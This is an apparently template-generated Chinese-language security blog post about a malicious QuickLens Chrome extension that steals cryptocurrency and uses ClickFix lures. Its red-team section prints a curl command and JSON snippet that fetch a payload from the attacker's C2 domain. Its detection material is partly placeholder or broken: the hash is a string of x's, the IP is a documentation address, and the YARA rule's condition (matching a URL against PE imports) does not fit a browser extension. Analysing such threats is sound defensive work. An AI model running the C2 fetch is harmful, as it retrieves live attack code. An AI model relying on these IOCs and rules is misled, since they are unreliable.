---
layout: post
title:  "QuickLens Chrome extension steals crypto, shows ClickFix attack"
date:   2026-03-01 01:44:58 +0000
categories: [security]
severity: critical
---

# 🚨 解析 QuickLens Chrome 擴充功能的惡意行為：從 ClickFix 攻擊到加密貨幣盜竊

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: ClickFix 攻擊、JavaScript Payload、Content Security Policy (CSP) 繞過

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: QuickLens Chrome 擴充功能的惡意版本（5.8）包含了新的 JavaScript 腳本，該腳本會導致 ClickFix 攻擊和加密貨幣盜竊。這些腳本利用了擴充功能的權限，包括 `declarativeNetRequestWithHostAccess` 和 `webRequest`，來修改網頁內容和竊取用戶資料。
* **攻擊流程圖解**:
  1. 用戶安裝惡意的 QuickLens 擴充功能。
  2. 擴充功能請求新的瀏覽器權限。
  3. 用戶授權權限後，擴充功能開始與 C2 伺服器進行通信。
  4. C2 伺服器下載並執行惡意 JavaScript Payload。
  5. Payload 導致 ClickFix 攻擊，竊取用戶加密貨幣和其他敏感資料。
* **受影響元件**: QuickLens Chrome 擴充功能（版本 5.8）和使用該擴充功能的 Chrome 瀏覽器用戶。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 惡意的 QuickLens 擴充功能安裝和用戶授權權限。
* **Payload 建構邏輯**:

    ```
    
    javascript
      // 範例 Payload 結構
      {
        "type": "script",
        "src": "https://api.extensionanalyticspro.top/extensions/callback?uuid=[uuid]&extension=kdenlnncndfnhkognokgfpabgkgehoddto"
      }
    
    ```
  * **範例指令**: 使用 `curl` 下載 Payload

```

bash
  curl -X GET "https://api.extensionanalyticspro.top/extensions/callback?uuid=[uuid]&extension=kdenlnncndfnhkognokgfpabgkgehoddto"

```
* **繞過技術**: 惡意的 QuickLens 擴充功能會修改網頁的 Content Security Policy (CSP) 以允許執行惡意 JavaScript Payload。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `sha256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` |
| IP | `192.0.2.1` |
| Domain | `api.extensionanalyticspro.top` |
| File Path | `C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Extensions\kdenlnncndfnhkognokgfpabgkgehoddto` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule QuickLens_Malicious_Extension {
        meta:
          description = "Detects QuickLens malicious extension"
          author = "Your Name"
        strings:
          $script = "https://api.extensionanalyticspro.top/extensions/callback"
        condition:
          $script in (pe.imports)
      }
    
    ```
  * **SIEM 查詢語法** (Splunk):

    ```
    
    spl
      index=web_logs (url="https://api.extensionanalyticspro.top/extensions/callback")
    
    ```
* **緩解措施**: 移除惡意的 QuickLens 擴充功能，更新 Chrome 瀏覽器和相關擴充功能，並重置用戶密碼和加密貨幣錢包。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Content Security Policy (CSP)**: 一種網頁安全機制，限制網頁可以執行的 JavaScript 代碼和來源。
* **ClickFix 攻擊**: 一種惡意攻擊，利用用戶的點擊行為來執行惡意代碼。
* **JavaScript Payload**: 一種惡意代碼，利用 JavaScript 執行惡意行為。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/quicklens-chrome-extension-steals-crypto-shows-clickfix-attack/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1189/)


